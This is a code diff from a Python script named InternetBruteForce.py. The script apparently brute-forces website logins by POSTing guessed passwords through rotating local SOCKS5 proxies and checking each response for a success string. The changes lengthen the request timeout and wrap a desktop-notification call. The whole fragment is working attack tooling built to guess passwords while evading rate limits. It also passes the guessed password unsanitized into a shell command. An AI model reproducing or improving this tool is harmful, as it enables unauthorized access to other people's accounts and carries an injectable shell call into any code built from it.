@@ -22,7 +22,7 @@ class UseProxies:
         if indicator[0].lower() == 's':
             try:
                 r = requests.post(self.website, data=self.data, proxies={'http': f'socks5h://localhost:{self.num}',
-                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=10)
+                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=60)
                 with open('website.html', 'w') as w:
                     w.write(r.text)
                 if indicator[1] in r.text and r.status_code == 200:
@@ -31,14 +31,17 @@ class UseProxies:
                         f.write(f"\n{str(datetime.now().time()).split('.')[0]} " + str(self.data) + "\n")
                     raise OverflowError
             except requests.exceptions.Timeout:
-                system(f'notify-send "InternetBruteForce.py" "Timeout occurred on {self.num} while trying {self.data["pwd"]}"')
+                try:
+                    system(f'notify-send "InternetBruteForce.py" "Timeout occurred on {self.num} while trying {self.data["pwd"]}"')
+                except:
+                    pass
                 raise StopAsyncIteration
             except (ProxyError, SSLZeroReturnError, ConnectionError, GeneralProxyError, RemoteDisconnected, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.Timeout, IncompleteRead, ProtocolError):
                 exit()
         elif indicator[0].lower() == 'u':
             try:
                 r = requests.post(self.website, data=self.data, proxies={'http': f'socks5h://localhost:{self.num}',
-                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=10)
+                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=60)
                 with open('website.html', 'w') as w:
                     w.write(r.text)
                 if indicator[1] not in r.text and r.status_code == 200:
